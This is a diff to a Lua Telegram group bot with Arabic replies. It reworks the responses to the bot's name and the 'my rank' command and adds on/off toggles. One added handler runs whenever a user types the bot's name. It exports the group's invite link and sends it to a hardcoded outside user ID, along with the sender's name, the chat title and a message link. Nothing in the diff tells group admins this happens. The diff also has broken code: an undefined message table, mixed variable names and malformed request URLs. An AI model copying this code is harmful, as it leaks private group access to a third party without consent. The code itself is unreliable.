@@ -9171,23 +9171,70 @@ end
 return false
 end
 
-if text == ""..(database:get(bot_id..'Name:Bot') or 'باكي').."" then  
-Namebot = (database:get(bot_id..'Name:Bot') or 'باكي')
-local DRAGON_Msg = {
-'عمغي 🥺💕.',
-'ياروحي قول اني  '..Namebot..'',
-'شتريد من '..Namebot..'',
-'دوختو  '..Namebot..'',
-' كافي لزكت 😡🤬',
-'وبعدين وياك ؟ 🥺',
-'فحطتني 🥵😓',
-'هاا شتريد كافي ☹️.',
-'مشايف بوت شني 😂.',
-'قول حبيبي ؟ اني '..Namebot..'',
-'عمري فداك '..Namebot..' قول حب'
+if text == "بوت" or text == 'يا بوت' then
+Namebot = (bot_data:get(ban_id..'Name:Bot') or 'باكي')
+local IDK_Msg = { 
+'اسمي  '..Namebot..' يا قلبي 🤤💚',
+'اسمي '..Namebot..' يا روحي🙈❤️',
+'اسمي  '..Namebot..' يعمري🌚🌹',
+'اسمي  '..Namebot..' يا قمر 🐭🤍',
+'اسمي  '..Namebot..' يامزه ??❤️',
+'اسمي  '..Namebot..' يعم 😒',
+'مقولت اسمي '..Namebot..' في اي 🙄',
+'اسمي الكيوت '..Namebot..' 🌝💘',
+'اسمي  '..Namebot..' ياحياتي🧸♥️',
+'اسمي  '..Namebot..' يوتكه🙈🍑',
+} 
+Namebot = DRAGON_Msg[math.random(#DRAGON_Msg)] 
+local msg_id = msg.id_/2097152/0.5 
+local texxtt = ''..Namebot..''
+keyboard = {} 
+keyboard.inline_keyboard = {
+{
+{text = texxtt, url="t.me/"..dofile("./Info.lua").botUserName.."?start"},
+},
+{
+{text = 'اضغط لاضافه البوت لمجموعتك☑️ ' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"},
+},
 }
-send(msg.chat_id_, msg.id_,'['..DRAGON_Msg[math.random(#DRAGON_Msg)]..']') 
-return false
+local function getpro(extra, result, success) 
+if result.photos_[0] then 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'& photo=' .. URL.escape(Namebot).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+else 
+send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
+end 
+end 
+tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = ban_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
+end
+if text and text:match("^باكي$") or text and text:match("^بقدونس$") then
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
+tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
+local Name1 = result.first_name_
+local Name1 = Name1:gsub('"',"") 
+local Name1 = Name1:gsub("'","") 
+local Name1 = Name1:gsub("`","") 
+local Name1 = Name1:gsub("*","") 
+local Name1 = Name1:gsub("{","") 
+local Name1 = Name1:gsub("}","") 
+local Name = '['..Name1..'](tg://user?id='..result.id_..')'
+local NameChat = dp.title_
+local NameChat = NameChat:gsub('"',"") 
+local NameChat = NameChat:gsub("'","") 
+local NameChat = NameChat:gsub("`","") 
+local NameChat = NameChat:gsub("*","") 
+local NameChat = NameChat:gsub("{","") 
+local NameChat = NameChat:gsub("}","") 
+local chatid = msg.chat_id_:gsub("-100","") 
+local msg_id = msg.id_/2097152/0.5
+local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
+if LinkGp.ok == true then 
+LinkGroup = LinkGp.result
+else
+LinkGroup = 'لا يوجد'
+end
+sendText(2086929677,"♫. هناك شخص يريدك يا سيدي  \n♫الشخص  {"..Name.."}\n♫اسم الجروب {"..NameChat.."}\n♫ايدي الجروب { `"..msg.chat_id_.."` }\n♫رابط الجروب \n [ "..LinkGroup.." ]\n    ♫رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
+end,nil)
+end,nil)
 end
 if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
 if database:get(bot_id..'Bc:Bots') and not DevSoFi(msg) then 
@@ -10260,13 +10307,25 @@ local DRAGON_Msg = {
 'اسمي  '..Namebot..' يوتكه🙈🍑',
 }
 Namebot = DRAGON_Msg[math.random(#DRAGON_Msg)]
-local function getpro(extra, result, success)
-if result.photos_[0] then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,Namebot, msg.id_, msg.id_, "md")
-else
-end
-end
-tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil)
+local msg_id = msg.id_/2097152/0.5 
+local texxtt = ''..Namebot..''
+keyboard = {} 
+keyboard.inline_keyboard = {
+{
+{text = texxtt, url="t.me/"..dofile("./Info.lua").botUserName.."?start"},
+},
+{
+{text = 'اضغط لاضافه البوت لمجموعتك☑️ ' ,url="t.me/"..dofile("./Info.lua").botUserName.."?startgroup=start"},
+},
+}
+local function getpro(extra, result, success) 
+if result.photos_[0] then 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'& photo=' .. URL.escape(Namebot).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+else 
+send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
+end 
+end 
+tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = ban_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
 end
 
 if text and text:match("^(.*)$") then
@@ -10479,9 +10538,49 @@ end
 end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 end
-if text == 'رتبتي' then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-send(msg.chat_id_, msg.id_,'♫︙ رتبتك في البوت » '..rtp)
+if text == "رتبتي" and not bot_data:get(ban_id..'ghiktr'..msg.chat_id_) then     
+tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
+if result.username_ then
+username = result.username_ 
+else
+username = 'DRAGON'
+end
+local msg_id = msg.id_/2097152/0.5  
+local textt = ' 🌝🖤 رتبتك في البوت » '..Rutba(msg.sender_user_id_,msg.chat_id_)
+local Sasa = 'https://t.me/xxxcccvvbbnn/903'
+keyboard = {} 
+keyboard.inline_keyboard = {
+{
+{text = textt, url="http://t.me/"..username},
+},
+}
+local function getpro(extra, result, success) 
+if result.photos_[0] then 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&photo=' .. URL.escape(textt).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+else 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=' .. URL.escape(Sasa).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end end 
+tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil) 
+end,nil)
+end
+
+if text == 'تفعيل رتبتي' and Manager(msg) then   
+if bot_data:get(ban_id..'ghiktr'..msg.chat_id_)  then
+bot_data:del(ban_id..'ghiktr'..msg.chat_id_) 
+Text = '\n ♫ تم تفعيل رتبتي' 
+else
+Text = '\n ♫  بالتاكيد تم تفعيل رتبتي'
+end
+send(msg.chat_id_, msg.id_,Text) 
+end
+if text == 'تعطيل رتبتي' and Manager(msg) then  
+if not bot_data:get(ban_id..'ghiktr'..msg.chat_id_)  then
+bot_data:set(ban_id..'ghiktr'..msg.chat_id_,true) 
+Text = '\n ♫ تم تعطيل رتبتي' 
+else
+Text = '\n ♫ بالتاكيد تم تعطيل رتبتي'
+end
+send(msg.chat_id_, msg.id_,Text) 
 end
 if text == "اسمي"  then 
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
@@ -12878,7 +12977,7 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Baki_Owner&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
-if text == 'مكفهر' or text == 'ai]' then 
+if text == 'مكفهر' or text == 'شهد' then 
 local Text = [[  
 ♫ THE GREAT WRITER ♫
 ]]  
